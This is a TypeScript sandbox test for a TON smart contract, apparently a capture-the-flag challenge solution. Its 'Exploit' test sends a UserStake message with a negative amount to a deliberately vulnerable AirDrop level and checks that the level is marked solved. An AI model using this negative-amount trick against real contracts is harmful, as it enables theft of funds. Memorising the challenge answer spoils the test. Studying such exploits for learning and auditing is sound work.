import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { AirDrop } from '../wrappers/wrappers/Airdrop';
import '@ton/test-utils';

// npx blueprint test Airdrop.spec.ts
describe('Airdrop', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<AirDrop>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await AirDrop.fromInit(0n));
    });

    it('Exploit', async () => {
        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            {
                $$type: 'UserStake',
                amount: -30000n,
            },
        );

        expect(await level.getIsSolved()).toEqual(true);
    });
});
